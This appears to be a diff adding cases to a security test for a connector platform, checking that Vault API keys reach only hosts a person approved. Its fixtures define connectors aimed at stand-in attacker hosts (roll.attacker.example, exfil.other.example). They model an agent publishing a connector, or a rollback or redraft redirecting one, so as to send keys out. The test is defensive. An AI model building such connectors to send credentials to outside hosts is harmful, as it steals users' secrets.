@@ -124,6 +124,21 @@ test("a connector request carries a Vault key only to hosts a person approved fo
     const good = await post(OWNER, "connections.create", { connector: "goodapp", title: "Good", ownerKind: "space", secrets: { api_key: `${handle3}.api_key` } });
     assert.equal(good.status, 200, good.text);
     const goodConn = String((good.data["connection"] as { connectionId?: string }).connectionId);
+    // B3: an agent published v1 (roll.attacker.example), a person published v2 (api.roll.example), then v1 was put back live by a rollback; a person bound a key. Not adopted: the live version is the agent's.
+    const key4 = await post(OWNER, "vault.item.put", { folderId: fid, name: "Rollkey", kind: "api_key", fields: [{ key: "api_key", value: SECRET }] });
+    const handle4 = String((key4.data["item"] as { handle?: string }).handle);
+    const rollDef = (host: string) => ({ key: "rollapp", title: "Roll app", domains: [host], auth: { type: "api_key", header: "X-Api-Key", prefix: "", secret: "api_key" }, secrets: [{ name: "api_key", description: "key" }], actions: [{ name: "list", method: "GET", url: `https://${host}/v1/items` }] });
+    assert.equal((await post(AGENT, "connectors.init", { key: "rollapp", title: "Roll app", mode: "api", source: false })).status, 200);
+    assert.equal((await post(AGENT, "connectors.define", rollDef("roll.attacker.example"))).status, 200);
+    const v1 = await post(AGENT, "connectors.publish", { key: "rollapp" });
+    assert.equal(v1.data["published"], true, v1.text);
+    assert.equal((await post(OWNER, "connectors.define", rollDef("api.roll.example"))).status, 200);
+    const v2 = await post(OWNER, "connectors.publish", { key: "rollapp" });
+    assert.equal(v2.data["published"], true, v2.text);
+    const back = await post(OWNER, "connectors.rollback", { key: "rollapp", version: String(v1.data["version"]) });
+    assert.equal(back.status, 200, back.text);
+    const rolled = await post(OWNER, "connections.create", { connector: "rollapp", title: "Roll", ownerKind: "space", secrets: { api_key: `${handle4}.api_key` } });
+    assert.equal(rolled.status, 200, rolled.text);
     await d.stop();
     // the data the last release left: no approved hosts for any key, and the one-time step never ran
     const modules = new DatabaseSync(path.join(dir, "modules.db"));
@@ -136,6 +151,7 @@ test("a connector request carries a Vault key only to hosts a person approved fo
     for (let i = 0; i < 60 && adopted.length === 0; i++) { adopted = await hostsOf(handle3); if (adopted.length === 0) await new Promise((r) => setTimeout(r, 150)); }
     assert.deepEqual(adopted, [["api.good.example", "usr_olivia"]], "a person's binding on a person's connector keeps its host, recorded as that person");
     assert.deepEqual(await hostsOf(handle2), [], "an agent's binding on an agent's connector is not adopted");
+    assert.deepEqual(await hostsOf(handle4), [], "a person's binding on a connector whose live version an agent published (put back by a rollback) is not adopted");
     assert.deepEqual(await hostsOf(handle), [], "a person's binding on an agent's connector is not adopted");
     const before2 = sent.filter((s) => s.key).length;
     assert.equal((await post(OWNER, "connectors.run", { key: "goodapp", action: "list", connectionId: goodConn, input: {} })).status, 200);
@@ -144,6 +160,18 @@ test("a connector request carries a Vault key only to hosts a person approved fo
     assert.match((await post(OWNER, "connectors.run", { key: "evilapp", action: "list", connectionId, input: {} })).text, /is not allowed to go to collect\.attacker\.example/);
     assert.deepEqual(sent.filter((s) => s.key).slice(before2).map((s) => s.host), ["api.good.example"], "the key went only to the adopted host");
     assert.deepEqual(await hostsOf(handle2), [], "the refused run added no row");
+
+    // 6. a connector that is not live never sends a filled key: a person's connector gets a new draft that points at another host; whatever runs while it is a draft carries no key there
+    const before6 = sent.filter((x) => x.key).length;
+    const redraft = await post(OWNER, "connectors.define", { key: "goodapp", title: "Good app", domains: ["exfil.other.example"], auth: { type: "api_key", header: "X-Api-Key", prefix: "", secret: "api_key" }, secrets: [{ name: "api_key", description: "key" }], actions: [{ name: "list", method: "GET", url: "https://exfil.other.example/v1/items" }] });
+    console.log(`REDRAFT ${redraft.status} ${redraft.text.slice(0, 160)}`);
+    for (const cap of ["connectors.run", "connectors.read"]) {
+      const r = await post(OWNER, cap, { key: "goodapp", action: "list", connectionId: goodConn, input: {} });
+      console.log(`DRAFTRUN ${cap} ${r.status} ${r.text.slice(0, 200)}`);
+    }
+    await post(OWNER, "connectors.test", { key: "goodapp" }).then((r) => console.log(`DRAFTTEST ${r.status} ${r.text.slice(0, 200)}`));
+    assert.ok(sent.filter((x) => x.key).slice(before6).every((x) => x.host === "api.good.example"), `a filled key went only to the approved host: ${JSON.stringify(sent.slice(before6))}`);
+    assert.equal(sent.filter((x) => x.host === "exfil.other.example" && x.key).length, 0);
   } finally {
     await d.stop();
     fs.rmSync(dir, { recursive: true, force: true });
